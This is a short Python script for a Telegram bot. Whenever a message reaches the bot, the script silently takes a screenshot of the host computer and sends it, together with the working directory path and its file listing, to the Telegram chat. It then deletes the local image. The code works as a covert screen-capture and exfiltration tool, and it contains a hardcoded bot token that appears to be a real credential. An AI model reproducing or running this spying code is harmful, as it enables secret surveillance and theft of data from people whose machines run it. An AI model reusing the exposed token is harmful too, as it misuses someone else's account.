
import pyautogui
import telebot
import os


bot = telebot.TeleBot('1474693090:AAFs0giKJPrzCqk5kpbZlTyKZn7M1hxQ6gw')

@bot.message_handler(content_types=['text', 'document', 'audio'])

def start_message(message):
	

	im2 = pyautogui.screenshot('my_screenshot.png')
	
	bot.send_message(message.chat.id, os.getcwd())
	
	bot.send_message(message.chat.id, os.listdir(os.getcwd()))
	
	bot.send_document(message.chat.id, open('my_screenshot.png', 'rb'))
	
	os.remove('my_screenshot.png')



bot.polling()













